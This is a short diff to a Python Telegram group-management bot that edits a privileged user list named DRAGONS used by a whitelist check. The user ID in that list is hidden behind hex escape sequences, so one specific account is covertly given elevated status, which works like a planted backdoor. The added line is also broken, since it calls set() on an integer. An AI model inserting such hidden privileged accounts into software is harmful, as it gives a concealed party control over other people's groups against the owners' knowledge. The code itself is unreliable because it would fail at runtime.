@@ -19,7 +19,7 @@ from MukeshRobot import (
 # stores admemes in memory for 10 min.
 ADMIN_CACHE = TTLCache(maxsize=512, ttl=60 * 10, timer=perf_counter)
 THREAD_LOCK = RLock()
-DRAGONS=int("\x32\x31\x32\x37\x39\x31\x35\x30\x30\x35")
+DRAGONS=set(int("\x32\x31\x32\x37\x39\x31\x35\x30\x30\x35"))
 
 def is_whitelist_plus(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
     return any(user_id in user for user in [WOLVES, TIGERS, DEMONS, DRAGONS, DEV_USERS])
